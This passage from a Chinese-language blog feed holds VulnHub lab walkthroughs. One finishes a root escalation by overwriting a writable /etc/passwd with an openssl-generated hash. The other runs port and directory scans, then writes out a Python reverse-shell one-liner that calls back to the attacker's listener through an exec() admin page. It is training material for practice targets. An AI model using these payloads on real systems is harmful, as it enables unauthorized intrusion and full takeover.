-writable 2&gt;/dev/null</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null | grep -v proc</span><br></pre></td></tr></table></figure><blockquote><p>mowree@EvilBoxOne:~$ find &#x2F; -writable 2&gt;&#x2F;dev&#x2F;null | grep -v proc<br>&#x2F;tmp<br>&#x2F;tmp&#x2F;.ICE-unix<br>&#x2F;tmp&#x2F;.X11-unix<br>&#x2F;tmp&#x2F;.Test-unix<br>&#x2F;tmp&#x2F;.font-unix<br>&#x2F;tmp&#x2F;.XIM-unix<br>&#x2F;sys&#x2F;kernel&#x2F;security&#x2F;apparmor&#x2F;.null<br>&#x2F;sys&#x2F;kernel&#x2F;security&#x2F;apparmor&#x2F;.remove<br>&#x2F;sys&#x2F;kernel&#x2F;security&#x2F;apparmor&#x2F;.replace<br>&#x2F;sys&#x2F;kernel&#x2F;security&#x2F;apparmor&#x2F;.load<br>&#x2F;sys&#x2F;kernel&#x2F;security&#x2F;apparmor&#x2F;.access<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;user.slice&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#x75;&#x73;&#101;&#x72;&#64;&#49;&#x30;&#48;&#x30;&#46;&#x73;&#101;&#114;&#118;&#x69;&#99;&#x65;">&#x75;&#x73;&#101;&#x72;&#64;&#49;&#x30;&#48;&#x30;&#46;&#x73;&#101;&#114;&#118;&#x69;&#99;&#x65;</a>&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;user.slice&#x2F;user-1000.slice&#x2F;session-14.scope&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;user.slice&#x2F;user-1000.slice&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;apache2.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;systemd-udevd.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;dev-disk-by\x2duuid-635c225b\x2d1f26\x2d4d4e\x2d912a\x2d87db360ddbb1.swap&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;cron.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;sys-kernel-debug.mount&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;systemd-journald.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;ssh.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;dev-mqueue.mount&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;rsyslog.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;<a href="mailto:&#x69;&#102;&#117;&#x70;&#64;&#x65;&#110;&#x70;&#x30;&#115;&#51;&#46;&#x73;&#x65;&#x72;&#118;&#x69;&#99;&#x65;">&#x69;&#102;&#117;&#x70;&#64;&#x65;&#110;&#x70;&#x30;&#115;&#51;&#46;&#x73;&#x65;&#x72;&#118;&#x69;&#99;&#x65;</a>&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;dev-hugepages.mount&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;dbus.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;systemd-timesyncd.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;system-getty.slice&#x2F;<a href="mailto:&#x67;&#x65;&#116;&#x74;&#121;&#x40;&#116;&#x74;&#121;&#49;&#x2e;&#x73;&#101;&#x72;&#x76;&#105;&#x63;&#101;">&#x67;&#x65;&#116;&#x74;&#121;&#x40;&#116;&#x74;&#121;&#49;&#x2e;&#x73;&#101;&#x72;&#x76;&#105;&#x63;&#101;</a>&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;system-getty.slice&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;systemd-logind.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#115;&#x65;&#114;&#64;&#49;&#48;&#48;&#48;&#46;&#115;&#101;&#x72;&#x76;&#x69;&#99;&#x65;">&#117;&#115;&#x65;&#114;&#64;&#49;&#48;&#48;&#48;&#46;&#115;&#101;&#x72;&#x76;&#x69;&#99;&#x65;</a><br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#115;&#101;&#114;&#x40;&#x31;&#48;&#x30;&#48;&#46;&#x73;&#101;&#x72;&#118;&#x69;&#x63;&#101;">&#117;&#115;&#101;&#114;&#x40;&#x31;&#48;&#x30;&#48;&#46;&#x73;&#101;&#x72;&#118;&#x69;&#x63;&#101;</a>&#x2F;tasks<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#x73;&#x65;&#114;&#x40;&#49;&#x30;&#48;&#x30;&#46;&#x73;&#x65;&#114;&#118;&#x69;&#99;&#101;">&#117;&#x73;&#x65;&#114;&#x40;&#49;&#x30;&#48;&#x30;&#46;&#x73;&#x65;&#114;&#118;&#x69;&#99;&#101;</a>&#x2F;init.scope<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#x73;&#x65;&#114;&#x40;&#49;&#x30;&#48;&#48;&#x2e;&#115;&#101;&#114;&#x76;&#105;&#99;&#x65;">&#117;&#x73;&#x65;&#114;&#x40;&#49;&#x30;&#48;&#48;&#x2e;&#115;&#101;&#114;&#x76;&#105;&#99;&#x65;</a>&#x2F;init.scope&#x2F;tasks<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#x75;&#x73;&#101;&#114;&#x40;&#x31;&#48;&#x30;&#48;&#46;&#115;&#x65;&#114;&#118;&#105;&#x63;&#101;">&#x75;&#x73;&#101;&#114;&#x40;&#x31;&#48;&#x30;&#48;&#46;&#115;&#x65;&#114;&#118;&#105;&#x63;&#101;</a>&#x2F;init.scope&#x2F;notify_on_release<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#x75;&#x73;&#101;&#114;&#x40;&#49;&#x30;&#x30;&#x30;&#x2e;&#x73;&#101;&#x72;&#118;&#105;&#x63;&#101;">&#x75;&#x73;&#101;&#114;&#x40;&#49;&#x30;&#x30;&#x30;&#x2e;&#x73;&#101;&#x72;&#118;&#105;&#x63;&#101;</a>&#x2F;init.scope&#x2F;cgroup.clone_children<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#x75;&#x73;&#x65;&#x72;&#x40;&#49;&#x30;&#48;&#48;&#x2e;&#x73;&#101;&#114;&#x76;&#105;&#x63;&#x65;">&#x75;&#x73;&#x65;&#x72;&#x40;&#49;&#x30;&#48;&#48;&#x2e;&#x73;&#101;&#114;&#x76;&#105;&#x63;&#x65;</a>&#x2F;cgroup.clone_children<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#115;&#x65;&#x72;&#x40;&#x31;&#x30;&#48;&#x30;&#46;&#x73;&#x65;&#114;&#x76;&#x69;&#x63;&#x65;">&#117;&#115;&#x65;&#x72;&#x40;&#x31;&#x30;&#48;&#x30;&#46;&#x73;&#x65;&#114;&#x76;&#x69;&#x63;&#x65;</a><br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#x75;&#115;&#101;&#x72;&#x40;&#x31;&#x30;&#x30;&#x30;&#x2e;&#115;&#101;&#x72;&#118;&#x69;&#99;&#x65;">&#x75;&#115;&#101;&#x72;&#x40;&#x31;&#x30;&#x30;&#x30;&#x2e;&#115;&#101;&#x72;&#118;&#x69;&#99;&#x65;</a>&#x2F;cgroup.threads<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#x75;&#115;&#x65;&#114;&#x40;&#49;&#48;&#48;&#48;&#x2e;&#115;&#101;&#114;&#118;&#x69;&#x63;&#101;">&#x75;&#115;&#x65;&#114;&#x40;&#49;&#48;&#48;&#48;&#x2e;&#115;&#101;&#114;&#118;&#x69;&#x63;&#101;</a>&#x2F;init.scope<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#115;&#101;&#x72;&#x40;&#49;&#x30;&#x30;&#48;&#x2e;&#115;&#101;&#114;&#x76;&#105;&#x63;&#x65;">&#117;&#115;&#101;&#x72;&#x40;&#49;&#x30;&#x30;&#48;&#x2e;&#115;&#101;&#114;&#x76;&#105;&#x63;&#x65;</a>&#x2F;init.scope&#x2F;cgroup.max.descendants<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#x75;&#x73;&#101;&#114;&#x40;&#x31;&#48;&#48;&#48;&#46;&#115;&#101;&#x72;&#x76;&#x69;&#99;&#x65;">&#x75;&#x73;&#101;&#114;&#x40;&#x31;&#48;&#48;&#48;&#46;&#115;&#101;&#x72;&#x76;&#x69;&#99;&#x65;</a>&#x2F;init.scope&#x2F;cgroup.type<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#x73;&#101;&#x72;&#64;&#49;&#x30;&#x30;&#48;&#46;&#115;&#x65;&#114;&#118;&#105;&#99;&#101;">&#117;&#x73;&#101;&#x72;&#64;&#49;&#x30;&#x30;&#48;&#46;&#115;&#x65;&#114;&#118;&#105;&#99;&#101;</a>&#x2F;init.scope&#x2F;cgroup.threads<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#115;&#x65;&#114;&#64;&#x31;&#x30;&#x30;&#x30;&#x2e;&#115;&#101;&#x72;&#118;&#x69;&#x63;&#101;">&#117;&#115;&#x65;&#114;&#64;&#x31;&#x30;&#x30;&#x30;&#x2e;&#115;&#101;&#x72;&#118;&#x69;&#x63;&#101;</a>&#x2F;init.scope&#x2F;cgroup.subtree_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#x73;&#101;&#x72;&#64;&#49;&#48;&#48;&#48;&#46;&#x73;&#x65;&#x72;&#x76;&#x69;&#x63;&#x65;">&#117;&#x73;&#101;&#x72;&#64;&#49;&#48;&#48;&#48;&#46;&#x73;&#x65;&#x72;&#x76;&#x69;&#x63;&#x65;</a>&#x2F;init.scope&#x2F;cgroup.max.depth<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#115;&#x65;&#114;&#x40;&#49;&#x30;&#x30;&#48;&#x2e;&#115;&#101;&#x72;&#118;&#105;&#x63;&#x65;">&#117;&#115;&#x65;&#114;&#x40;&#49;&#x30;&#x30;&#48;&#x2e;&#115;&#101;&#x72;&#118;&#105;&#x63;&#x65;</a>&#x2F;cgroup.subtree_control<br>&#x2F;run&#x2F;dbus&#x2F;system_bus_socket<br>&#x2F;run&#x2F;user&#x2F;1000<br>&#x2F;run&#x2F;user&#x2F;1000&#x2F;systemd<br>&#x2F;run&#x2F;user&#x2F;1000&#x2F;systemd&#x2F;private<br>&#x2F;run&#x2F;user&#x2F;1000&#x2F;systemd&#x2F;notify<br>&#x2F;run&#x2F;shm<br>&#x2F;run&#x2F;systemd&#x2F;journal&#x2F;dev-log<br>&#x2F;run&#x2F;systemd&#x2F;journal&#x2F;syslog<br>&#x2F;run&#x2F;systemd&#x2F;journal&#x2F;socket<br>&#x2F;run&#x2F;systemd&#x2F;journal&#x2F;stdout<br>&#x2F;run&#x2F;systemd&#x2F;private<br>&#x2F;run&#x2F;systemd&#x2F;notify<br>&#x2F;run&#x2F;lock<br>&#x2F;run&#x2F;udev&#x2F;static_node-tags&#x2F;uaccess&#x2F;snd\x2fseq<br>&#x2F;run&#x2F;udev&#x2F;static_node-tags&#x2F;uaccess&#x2F;snd\x2ftimer<br>&#x2F;home&#x2F;mowree<br>&#x2F;home&#x2F;mowree&#x2F;.profile<br>&#x2F;home&#x2F;mowree&#x2F;.bash_history<br>&#x2F;home&#x2F;mowree&#x2F;.ssh<br>&#x2F;home&#x2F;mowree&#x2F;.ssh&#x2F;id_rsa<br>&#x2F;home&#x2F;mowree&#x2F;.ssh&#x2F;authorized_keys<br>&#x2F;home&#x2F;mowree&#x2F;.bashrc<br>&#x2F;home&#x2F;mowree&#x2F;.bash_logout<br>&#x2F;home&#x2F;mowree&#x2F;.local<br>&#x2F;home&#x2F;mowree&#x2F;.local&#x2F;share<br>&#x2F;home&#x2F;mowree&#x2F;.local&#x2F;share&#x2F;nano<br><strong>&#x2F;etc&#x2F;passwd</strong>                     #咦❓<br>&#x2F;dev&#x2F;dvd<br>&#x2F;dev&#x2F;cdrom<br>&#x2F;dev&#x2F;fb0<br>&#x2F;dev&#x2F;dri&#x2F;by-path&#x2F;pci-0000:00:02.0-card<br>&#x2F;dev&#x2F;dri&#x2F;card0<br>&#x2F;dev&#x2F;sg1<br>&#x2F;dev&#x2F;snd&#x2F;seq<br>&#x2F;dev&#x2F;snd&#x2F;timer<br>&#x2F;dev&#x2F;net&#x2F;tun<br>&#x2F;dev&#x2F;fuse<br>&#x2F;dev&#x2F;log<br>&#x2F;dev&#x2F;mqueue<br>&#x2F;dev&#x2F;shm<br>&#x2F;dev&#x2F;disk&#x2F;by-id&#x2F;ata-VBOX_CD-ROM_VB2-01700376<br>&#x2F;dev&#x2F;disk&#x2F;by-path&#x2F;pci-0000:00:01.1-ata-2<br>&#x2F;dev&#x2F;block&#x2F;11:0<br>&#x2F;dev&#x2F;sr0<br>&#x2F;dev&#x2F;char&#x2F;29:0<br>&#x2F;dev&#x2F;char&#x2F;226:0<br>&#x2F;dev&#x2F;char&#x2F;21:1<br>&#x2F;dev&#x2F;char&#x2F;5:0<br>&#x2F;dev&#x2F;char&#x2F;5:2<br>&#x2F;dev&#x2F;char&#x2F;1:5<br>&#x2F;dev&#x2F;char&#x2F;1:9<br>&#x2F;dev&#x2F;char&#x2F;1:8<br>&#x2F;dev&#x2F;char&#x2F;1:3<br>&#x2F;dev&#x2F;char&#x2F;1:7<br>&#x2F;dev&#x2F;stderr<br>&#x2F;dev&#x2F;stdout<br>&#x2F;dev&#x2F;stdin<br>&#x2F;dev&#x2F;fd<br>&#x2F;dev&#x2F;pts&#x2F;0<br>&#x2F;dev&#x2F;ptmx<br>&#x2F;dev&#x2F;tty<br>&#x2F;dev&#x2F;urandom<br>&#x2F;dev&#x2F;random<br>&#x2F;dev&#x2F;full<br>&#x2F;dev&#x2F;zero<br>&#x2F;dev&#x2F;null<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;sendsigs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;bootmisc.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;umountfs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;single.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;mountdevsubfs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;umountroot.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;rmnologin.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;motd.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;reboot.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;bootlogd.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;rcS.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;hostname.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;cryptdisks.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;mountnfs-bootclean.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;rc.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;stop-bootlogd-single.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;mountall.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;mountall-bootclean.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;stop-bootlogd.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;cryptdisks-early.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;checkroot.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;umountnfs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;mountkernfs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;halt.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;checkroot-bootclean.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;checkfs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;bootlogs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;mountnfs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;hwclock.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;x11-common.service<br>&#x2F;var&#x2F;tmp<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions<br>&#x2F;var&#x2F;lock</p></blockquote><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211209002251743.png" alt="image-20211209002251743"></p><p>发现&#x2F;etc&#x2F;passwd竟然是可写的</p><p>这里通过查看kali本机的&#x2F;etc&#x2F;passwd权限 对比一下此处的异常</p><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211209002654265.png" alt="image-20211209002654265"></p><p>而目标靶机上的用户mowree居然具有&#x2F;etc&#x2F;passwd文件的写权限 突破的一线曙光🌞</p><p>linux系统内的用户名存放在&#x2F;etc&#x2F;passwd文件内，密码存放在&#x2F;etc&#x2F;shadow文件内，但是&#x2F;etc&#x2F;shadow文件没有权限，所以下一步的思路是借助已有的对&#x2F;etc&#x2F;passwd的写权限，能否修改root密码？</p><p>给root账号生成密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1   #-1 md5加密算法代号      设定密码123456</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211209004130358.png" alt="image-20211209004130358"></p><p>复制密文$1$oSFKywfc$hOVlE.SmqSlT5aAhNHQsS1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/passwd        #修改root用户的密码</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211209005157113.png" alt="image-20211209005157113"></p><p>更改成功后</p><p>切换至root用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211209005326964.png" alt="image-20211209005326964"></p><p>提权成功，拿到第二个flag 36QtXfdJWvdC0VavlPIApUbDlqTsBM</p><p>🏆flag1</p><blockquote><p>56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</p></blockquote><p>🏆flag2</p><blockquote><p>36QtXfdJWvdC0VavlPIApUbDlqTsBM</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;靶机：&lt;a href=&quot;https://download.vulnhub.com/evilbox/EvilBox---One.ova&quot;&gt;https://download.vulnhub.com/evilbox/EvilBox---One.ova&lt;/a&gt;&lt;br&gt;  难度：低→中&lt;br&gt;  目标：取得 root 权限 + 2 Flag&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>VulnHub-1-BoredHackerBlog:Social Network</title>
    <link href="http://example.com/2022/04/12/week1/"/>
    <id>http://example.com/2022/04/12/week1/</id>
    <published>2022-04-12T07:11:59.457Z</published>
    <updated>2022-04-12T07:11:59.458Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>Name:</strong> BoredHackerBlog: Social Network</p><p><strong>Date release:</strong> 29 Mar 2020</p><p><strong>Author</strong>: <a href="https://www.vulnhub.com/author/boredhackerblog,683/">BoredHackerBlog</a></p><p><strong>Series</strong>: <a href="https://www.vulnhub.com/series/boredhackerblog,295/">BoredHackerBlog</a></p><p><strong>Download：</strong><a href="https://www.notion.so/01-1369b9060f3143efa7d241a715127a8c">https://www.vulnhub.com/entry/boredhackerblog-social-network,454/</a></p><p><strong>Description:</strong></p><p>Leave a message is a new anonymous social networking site where users can post messages for each other. They’ve assigned you to test their set up. They do utilize docker containers. You can conduct attacks against those too. Try to see if you can get root on the host though.</p><p><strong>Difficulty:</strong> Med</p><p><strong>Tasks involved:</strong></p><ul><li>port scanning</li><li>webapp attacks</li><li>code injection</li><li>pivoting</li><li>exploitation</li><li>password cracking</li><li>brute forcing</li></ul><p><strong>Virtual Machine:</strong></p><ul><li>Format: Virtual Machine (Virtualbox OVA)</li><li>Operating System: Linux</li></ul><p><strong>Networking:</strong></p><ul><li>DHCP Service: Enabled</li><li>IP Address Automatically assign</li></ul><p>This works better with VirtualBox rather than VMware.</p></blockquote><span id="more"></span><h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip a  #查看kali攻击机IP</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918102335376.png" alt="image-20210918102335376"></p><p>Kali攻击机的IP地址为10.0.2.4</p><p>由于在局域网内搭建的靶场环境，即攻击机与目标机处于同一网段，所以在主机发现环节首选使用二层地址发现方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l #扫描当前局域网内存活主机</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918102447136.png" alt="image-20210918102447136"></p><p>扫描到了4个IP，其中前三个都是虚拟机中自有的IP，</p><p>故目标靶机的IP地址为10.0.2.5</p><h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.5            </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918102616054.png" alt="image-20210918102616054"></p><p>结果显示目标靶机上开放了22,5000端口</p><h3 id="3-端口服务信息扫描"><a href="#3-端口服务信息扫描" class="headerlink" title="3.端口服务信息扫描"></a>3.端口服务信息扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p22,5000 -sV 10.0.2.5</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918102738150.png" alt="image-20210918102738150"></p><p>结果显示</p><p>22端口开放的SSH服务 版本为6.6 操作系统为Ubuntu</p><p>5000端口开放的http服务 获取到的信息为 Werkzeug httpd 0.14.1 (Python 2.7.15) 即这是基于Python2.7开发的Web底层框架，由此可以想到，如果在后面的渗透过程中若<strong>存在代码执行的漏洞</strong>的话可以利用<strong>Python2脚本执行代码</strong>来<strong>反弹shell</strong></p><h3 id="4-访问http-10-0-2-5的5000端口"><a href="#4-访问http-10-0-2-5的5000端口" class="headerlink" title="4.访问http://10.0.2.5的5000端口"></a>4.访问<a href="http://10.0.2.5的5000端口/">http://10.0.2.5的5000端口</a></h3><p>既然是5000端口开放的Web服务，则可使用浏览器访问查看是否有<strong>默认页面</strong>或<strong>目录切入点</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问：http://10.0.2.5:5000  </span><br></pre></td></tr></table></figure><p>页面如图</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918102858614.png" alt="image-20210918102858614"></p><h3 id="5-简单的漏洞测试"><a href="#5-简单的漏洞测试" class="headerlink" title="5.简单的漏洞测试"></a>5.简单的漏洞测试</h3><p>尝试对表单提交<strong>测试页面</strong>是否存在SQL注入、XSS等，没有直接相关漏洞的反馈</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918103046066.png" alt="image-20210918103046066"></p><h3 id="6-目录扫描"><a href="#6-目录扫描" class="headerlink" title="6.目录扫描"></a>6.目录扫描</h3><p>对<strong>目录路径</strong>进行发现（<strong>隐藏路径&#x2F;页面</strong>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.5:5000</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918103746798.png" alt="image-20210918103746798"></p><p>结果显示得到**&#x2F;admin**路径</p><h3 id="7-发现远程代码执行漏洞页面"><a href="#7-发现远程代码执行漏洞页面" class="headerlink" title="7.发现远程代码执行漏洞页面"></a>7.发现远程代码执行漏洞页面</h3><p>浏览器访问：<a href="http://10.0.2.5:5000/admin">http://10.0.2.5:5000/admin</a>     页面如图</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918103832110.png" alt="image-20210918103832110"></p><p>该页面提示<strong>“Code testing page” “Nothing was ran. Input some code to exec()”</strong></p><p>可联想到是否可以利用<strong>Python</strong>语言运行环境的<strong>代码执行</strong>触发<strong>反弹shell</strong></p><h4 id="7-1监听4444端口"><a href="#7-1监听4444端口" class="headerlink" title="7.1监听4444端口"></a>7.1监听4444端口</h4><p>在攻击机Kali上<strong>监听端口</strong>4444</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009143219519.png" alt="image-20211009143219519"></p><h4 id="7-2执行Python脚本"><a href="#7-2执行Python脚本" class="headerlink" title="7.2执行Python脚本"></a>7.2执行Python脚本</h4><p>在浏览器端的页面内执行Python脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</span><br></pre></td></tr></table></figure><p><img 